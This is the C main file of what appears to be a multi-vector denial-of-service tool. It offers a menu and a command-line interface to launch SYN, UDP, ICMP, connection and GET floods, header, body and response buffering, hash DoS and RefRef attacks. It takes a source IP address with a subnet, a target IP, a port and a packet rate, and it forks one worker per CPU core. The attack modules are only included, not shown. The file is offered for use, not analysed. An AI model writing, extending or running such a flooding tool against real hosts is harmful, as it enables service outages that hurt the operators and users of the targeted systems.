#include "header.h"
#include "main.h"

#include "ddos/get_flood.h"
#include "ddos/icmp_flood.h"
#include "ddos/syn_flood.h"
#include "ddos/udp_flood.h"
#include "ddos/conn_flood.h"
#include "ddos/hash_dos.h"
#include "ddos/header_buffering.h"
#include "ddos/body_buffering.h"
#include "ddos/response_buffering.h"
#define __SIZE_OF_INPUT__ 200
#define __MAX_TOKEN_NUM__ 20
#define __ATTACK_TYPES__ 10

int g_recv_flag = 0;
int g_num_threads = 10;
int g_num_cores = 1;
int	g_fork_cnt = 0;

int g_pid_list[100];

char g_input[__SIZE_OF_INPUT__];
char *g_tokens[__MAX_TOKEN_NUM__ ];
void (*g_usage_functions[__ATTACK_TYPES__ + 1])(void) = { NULL,
				syn_flood_print_usage,
				udp_flood_print_usage,
				icmp_flood_print_usage,
				conn_flood_print_usage,
				get_flood_print_usage,
				header_buffering_print_usage,
				body_buffering_print_usage,
				response_buffering_print_usage,
				hash_dos_print_usage
			};
void (*g_main_functions[__ATTACK_TYPES__ + 1])(char *[]) = { NULL,
				syn_flood_main,
				udp_flood_main,
				icmp_flood_main,
				conn_flood_main,
				get_flood_main,
				header_buffering_main,
				body_buffering_main,
				response_buffering_main,
				hash_dos_main
			};

void sigint_handler(int signo)
{
	int i;
	for(i=0;i<g_num_cores;i++)
	{
		printf("Killig : %d\n",g_pid_list[i]);
		kill(g_pid_list[i], SIGKILL);
	}

}


void get_input(void)
{
	printf("$ ");
	void *ptr = fgets(g_input, __SIZE_OF_INPUT__, stdin);
	return;
}

void make_tokens(void)
{
	int i;
	for (i = 0; i < __MAX_TOKEN_NUM__; i++)
		g_tokens[i] = NULL;
	i = 0;
	g_tokens[i] = strtok(g_input, " ");
	while (g_tokens[i] != NULL) {
		i++;
		g_tokens[i] = strtok(NULL, " ");
	}
	return;
}

bool check_options(char *argv[], int argc)
{
	bool is_command = false;
	for (int i = 1; i < argc; i++) {
		if (*argv[i] != '-') {
			is_command = true;
		} else {
			if (!strcmp(argv[i], "-r")) {
				g_recv_flag = atoi(argv[i + 1]);
			} else if (!strcmp(argv[i], "-c")) {
				g_num_cores = atoi(argv[i + 1]);
			} else if (!strcmp(argv[i], "-t")) {
				g_num_threads = atoi(argv[i + 1]);
			} else if (!strcmp(argv[i], "--help") ||
								 !strcmp(argv[i], "-help")) {
				print_usage(argv);
				exit(0);
			}
			i++;
		}
	}
	return is_command;
}

attack_type argv_to_tokens(char *argv[], int argc)
{
	int argv_idx;
	int token_idx;
	attack_type type;

	for (argv_idx = 1; argv_idx < argc; argv_idx++) {
		if (*argv[argv_idx] == '-') {
			argv_idx++;
		} else {
			break;
		}
	}
	if (argv_idx == argc) {
		return NONE;
	}
	if (!strcmp(argv[argv_idx], "syn") ||
			!strcmp(argv[argv_idx], "SYN") ||
			!strcmp(argv[argv_idx], "1")) {
		type = SYN;
	} else if (!strcmp(argv[argv_idx], "udp") ||
					   !strcmp(argv[argv_idx], "UDP") ||
					   !strcmp(argv[argv_idx], "2")) {
		type = UDP;
	} else if (!strcmp(argv[argv_idx], "icmp") ||
					   !strcmp(argv[argv_idx], "ICMP") ||
					   !strcmp(argv[argv_idx], "3")) {
		type = ICMP;
	} else if (!strcmp(argv[argv_idx], "conn") ||
					 !strcmp(argv[argv_idx], "CONN") ||
					 !strcmp(argv[argv_idx], "4")) {
		type = CONN;
	} else if (!strcmp(argv[argv_idx], "get") ||
					 !strcmp(argv[argv_idx], "GET") ||
					 !strcmp(argv[argv_idx], "5")) {
		type = GET;
	} else if (!strcmp(argv[argv_idx], "head") ||
					 !strcmp(argv[argv_idx], "HEAD") ||
					 !strcmp(argv[argv_idx], "6")) {
		type = HEAD;
	} else if (!strcmp(argv[argv_idx], "body") ||
					 !strcmp(argv[argv_idx], "BODY") ||
					 !strcmp(argv[argv_idx], "7")) {
		type = BODY;
	} else if (!strcmp(argv[argv_idx], "resp") ||
					 !strcmp(argv[argv_idx], "RESP") ||
					 !strcmp(argv[argv_idx], "8")) {
		type = RESP;
	} else if (!strcmp(argv[argv_idx], "hash") ||
					 !strcmp(argv[argv_idx], "HASH") ||
					 !strcmp(argv[argv_idx], "9")) {
		type = HASH;
	} else if (!strcmp(argv[argv_idx], "ref") ||
					 !strcmp(argv[argv_idx], "REF") ||
					 !strcmp(argv[argv_idx], "10")) {
		type = REF;
	} else {
		type = NONE;
	}
	argv_idx++;
	if (argv_idx >= argc) {
		return NONE;
	}
	for (token_idx = 0; argv_idx < argc; argv_idx++) {
		if (*argv[argv_idx] == '-') {
			break;
		}
		g_tokens[token_idx++] = argv[argv_idx];
	}
	g_tokens[token_idx] = NULL;
	if (token_idx != 4) {
		return NONE;
	}
	return type;
}

int choose_running_type(void)
{
	printf("== Choose Running Type\n");
	printf("== 1. Number Based\n"
			"== 2. Over Time\n");
	printf("== ");
	get_input();
	int t = atoi(g_input);
	while (t <= 0 || t > 2) {
		printf("Input should be over 0 AND <=2\n");
		get_input();
		t = atoi(g_input);
	}
	return t;
}

attack_type type_choose_attack(void)
{
	printf("\n"
			"   [Serverless Attacks]\n"
			"1. SYN flooding\n"
			"2. UDP flooding\n"
			"3. ICMP flooding\n"
			"\n"
			"   [Server Required Attacks]\n"
			"4. Connection flooding\n"
			"5. Get flooding\n"
			"6. Header buffering\n"
			"7. Body buffering\n"
			"8. Response buffering\n"
			"9. Hash Dos\n"
			"10. RefRef\n\n");
	get_input();
	attack_type t = atoi(g_input);
	while (t <= 0 || t > 10) {
		printf("Input should be over 0 AND <=10\n");
		get_input();
		t = atoi(g_input);
	}
	return t;
}

#define DRAW_HEIGHT 7
#define DRAW_WIDTHB 8
#define DRAW_WIDTHS 6

void print_main(void)
{
	char num[11];  // here too one extra room is needed for the '\0'
	char c;  // for option
	int i, j, k;
	// declaring char 2D arrays and initializing with hash-printed digits
	char upp_d[DRAW_HEIGHT][DRAW_WIDTHB] = { " ####  ", " #   # ", " #   # ",
					" #   # ", " #   # ", " #   # ", " ####  " },
			low_o[DRAW_HEIGHT][DRAW_WIDTHB] = { "       ", "       ", "       ",
					" ##### ", " #   # ", " #   # ", " ##### " },
			upp_s[DRAW_HEIGHT][DRAW_WIDTHB] = { " ##### ", " #     ", " #     ",
					" ##### ", "     # ", "     # ", " ##### " },
			upp_u[DRAW_HEIGHT][DRAW_WIDTHB] = { "       ", " #   # ", " #   # ",
					" #   # ", " #   # ", " #   # ", " ##### " },
			low_t[DRAW_HEIGHT][DRAW_WIDTHB] = { "       ", "       ", "   #   ",
					" ##### ", "   #   ", "   #   ", "   ### " },
			low_i[DRAW_HEIGHT][DRAW_WIDTHS] = { "     ", "     ", "  #  ",
					"     ", "  #  ", "  #  ", "  #  " },
			low_l[DRAW_HEIGHT][DRAW_WIDTHS] = { "     ", "  #  ", "  #  ",
					"  #  ", "  #  ", "  #  ", "  #  " };
	printf("-----------------------------\n");
	for (i = 0; i < DRAW_HEIGHT; i++) {
		printf("|");
		for (j = 0; j < DRAW_WIDTHB; j++) {
			printf("%c", upp_d[i][j]);
		}
		for (j = 0; j < DRAW_WIDTHB; j++) {
			printf("%c", upp_d[i][j]);
		}
		for (j = 0; j < DRAW_WIDTHB; j++) {
			printf("%c", low_o[i][j]);
		}
		for (j = 0; j < DRAW_WIDTHB; j++) {
			printf("%c", upp_s[i][j]);
		}
		printf("|");
		printf("\n");
	}
	for (i = 0; i < DRAW_HEIGHT; i++) {
		printf("|");
		for (j = 0; j < DRAW_WIDTHB; j++) {
			printf("%c", upp_u[i][j]);
		}
		for (j = 0; j < DRAW_WIDTHB; j++) {
			printf("%c", low_t[i][j]);
		}
		for (j = 0; j < DRAW_WIDTHS; j++) {
			printf("%c", low_i[i][j]);
		}
		for (j = 0; j < DRAW_WIDTHS; j++) {
			printf("%c", low_l[i][j]);
		}
		printf("    |");
		printf("\n");
	}
	printf("-----------------------------\n");
	return;
}

void print_usage(char *argv[])
{
	printf("Usage: sudo %s [options] [attack_types] "
				 "[Src-IP] [Dest-IP] [Dest-Port] [#Request/s] ...\n",
			argv[0]);
	printf("\n");
	printf("\e[1mOPTIONS\e[0m \n"
				 "-r \n"
				 "    RECV Flags.\n"
				 "-t \n"
				 "    Number of threads.\n"
				 "-c \n"
				 "    Number of CPU-cores(for multi-processing).\n");
	printf("\n");
	printf("\e[1mATTACK TYPES\e[0m \n"
				 "  [Serverless Attacks]\n"
				 "    syn,  SYN,   1        SYN Flooding Attack\n"
				 "    udp,  UDP,   2        UDP Flooding Attack\n"
				 "    icmp, ICMP,  3        ICMP Flooding Attack\n"
				 "  [Server Required Attacks]\n"
				 "    conn, CONN,  4        Connection Flooding Attack\n"
				 "    get,  GET,   5        GET Flooding Attack\n"
				 "    head, HEAD,  6        Header Buffering Attack\n"
				 "    body, BODY,  7        Body Buffering Attack\n"
				 "    resp, RESP,  8        Response Buffering Attack\n"
				 "    hash, HASH,  9        Hash Dos Attack\n"
				 "    ref,  REF,  10        RefRef Attack\n");
	printf("\n");
	printf("\e[1mSOURCE IP ADDRESS\e[0m \n"
				 "    The format is [IPv4 Address]/[Subnet Masking(Optional)].\n"
				 "    IPv4 Address format is XXX.XXX.XXX.XXX.\n"
				 "    Subnet Masking format is 0 ~ 32 integer. It is optional.\n");
	printf("\n");
	printf("\e[1mDESTINATION IP ADDRESS\e[0m \n"
				 "    The format is [IPv4 Address]/[Subnet Masking(Optional)].\n"
				 "    IPv4 Address format is XXX.XXX.XXX.XXX.\n"
				 "    Subnet Masking format is 0 ~ 32 integer. It is optional.\n");
	printf("\n");
	printf("\e[1mDESTINATION PORT NUMBER\e[0m \n"
				 "    The format is 0 ~ 65,535 integer.\n");
	printf("\n");
	printf("\e[1mNUMBER OF REQUESTS PER SECOND\e[0m \n"
				 "    The format is unsigned integer.\n"
				 "    It is a number of Packet sent to Dest every second.\n");
	printf("\n");
	return;
}

int main(int argc, char *argv[])
{
	int mode;
	bool is_command;
	attack_type type;

	is_command = check_options(argv, argc);
	if (!is_command) {
		print_main();
		type = type_choose_attack();
		g_usage_functions[type]();
		get_input();
		make_tokens();
	} else {
		type = argv_to_tokens(argv, argc);
	}
	if (type == NONE) {
		print_usage(argv);
		return 0;
	}
	printf("num core : %d\n",g_num_cores);

	signal(SIGINT, sigint_handler);

	int i;

	for(i=0;i<g_num_cores;i++)
	{
		g_pid_list[i] = fork();
		if(g_pid_list[i] < 0)
		{
			perror("fork");
			abort();
		}
		else if(g_pid_list[i] == 0 )
		{
			g_main_functions[type](g_tokens);
			exit(0);
		}
	}

	int status;
	int count;
	while(count>=0)
	{
		int pid = wait(&status);
		--count;
	}

	return 0;
}
